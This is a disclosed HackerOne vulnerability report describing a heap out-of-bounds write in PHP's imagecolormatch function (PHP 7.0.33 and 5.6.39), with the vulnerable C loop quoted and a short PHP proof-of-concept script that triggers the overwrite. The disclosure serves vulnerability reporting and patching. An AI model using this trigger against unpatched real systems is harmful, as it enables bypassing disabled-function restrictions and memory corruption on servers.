# imagecolormatch Out Of Bounds Write on Heap 

## Report Details
- **Report ID**: 478368
- **URL**: https://hackerone.com/reports/478368
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-01-12T00:46:15.849Z
- **Disclosed**: 2020-10-10T08:14:53.492Z

## Reporter
- **Username**: simonscannell
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The link to the PHP bug: https://bugs.php.net/bug.php?id=77270

This is possible to exploit in PHP 7.0.33 and 5.6.39. I used this vulnerability to write a local safe mode bypass exploit.

It is possible to write up to 1200 bytes over the boundaries of a buffer allocated in the imagecolormatch function, which then calls gdImageColorMatch()

The function takes two gdImagePtr as arguments and wants to compare both of them. It then allocates a dynamic buffer with the following calculation:

`buf = (unsigned long *)safe_emalloc(sizeof(unsigned long), 5 * im2->colorsTotal, 0);`

im2->colorsTotal is under the control of an attacker. By simply allocating only one color to the second image, the calculation becomes sizeof(unsigned long) (8 byte on a 64 bit system) * 5 * 1, which results in a buffer of 40 bytes.

```
The buffer is then written to in a for loop.
	for (x=0; x<im1->sx; x++) {
		for( y=0; y<im1->sy; y++ ) {
			color = im2->pixels[y][x];
			rgb = im1->tpixels[y][x];
			bp = buf + (color * 5);
			(*(bp++))++;
			*(bp++) += gdTrueColorGetRed(rgb);
			*(bp++) += gdTrueColorGetGreen(rgb);
			*(bp++) += gdTrueColorGetBlue(rgb);
			*(bp++) += gdTrueColorGetAlpha(rgb);
		}

The buffer is written to by means of a color being the index:
color = im2->pixels[y][x];
..
bp = buf + (color * 5);
```

However, an attacker can set the value of color to be at maximum 255 (since it is a char). This would result in bp pointing at buffer + 1275 bytes. Since buffer is only 40 bytes big, this leads to an out of bounds write with data that is also under the control of the attacker.

PoC PHP script:

```
$img1 = imagecreatetruecolor(0xfff, 0xfff);
$img2 = imagecreate(0xfff, 0xfff);
imagecolorallocate($img2, 0, 0, 0);
imagesetpixel($img2, 0, 0, 255);
imagecolormatch($img1, $img2);
```

## Impact

This vulnerability allows attackers to bypass local security restrictions such as disabled functions.

## Attachments
No attachments
